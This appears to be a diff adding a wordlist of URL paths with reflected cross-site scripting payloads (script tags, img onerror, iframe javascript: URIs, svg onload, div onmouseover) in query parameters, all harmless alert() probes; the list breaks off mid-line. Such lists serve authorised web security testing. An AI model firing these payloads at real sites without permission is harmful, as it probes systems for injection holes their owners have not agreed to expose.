@@ -1,0 +1,37 @@
+/search?query=<script>alert('XSS')</script>
+/comment?text=<img src=x onerror=alert('XSS')>
+/message?body=<iframe src=javascript:alert('XSS')>
+/feedback?note=<svg onload=alert('XSS')>
+/form?input=<div onmouseover=alert('XSS')>hover me</div>
+/review?text=<script>alert('XSS')</script>
+/post?comment=<img src=x onerror=alert('XSS')>
+/article?title=<iframe src=javascript:alert('XSS')>
+/page?content=<svg onload=alert('XSS')>
+/blog?entry=<div onmouseover=alert('XSS')>hover me</div>
+/forum?post=<script>alert('XSS')</script>
+/topic?discussion=<img src=x onerror=alert('XSS')>
+/thread?reply=<iframe src=javascript:alert('XSS')>
+/group?chat=<svg onload=alert('XSS')>
+/event?description=<div onmouseover=alert('XSS')>hover me</div>
+/profile?bio=<script>alert('XSS')</script>
+/settings?note=<img src=x onerror=alert('XSS')>
+/preferences?option=<iframe src=javascript:alert('XSS')>
+/activity?log=<svg onload=alert('XSS')>
+/history?entry=<div onmouseover=alert('XSS')>hover me</div>
+/logs?record=<script>alert('XSS')</script>
+/audit?note=<img src=x onerror=alert('XSS')>
+/review?comment=<iframe src=javascript:alert('XSS')>
+/details?info=<svg onload=alert('XSS')>
+/summary?report=<div onmouseover=alert('XSS')>hover me</div>
+/search?query=<script>alert(1)</script>
+/comment?text=<img src=x onerror=alert(1)>
+/message?body=<iframe src=javascript:alert(1)>
+/feedback?note=<svg onload=alert(1)>
+/form?input=<div onmouseover=alert(1)>hover me</div>
+/review?text=<script>alert(1)</script>
+/post?comment=<img src=x onerror=alert(1)>
+/article?title=<iframe src=javascript:alert(1)>
+/page?content=<svg onload=alert(1)>
+/blog?entry=<div onmouseover=alert(1)>hover me</div>
+/forum?post=<script>alert(1)</script>
+/topic
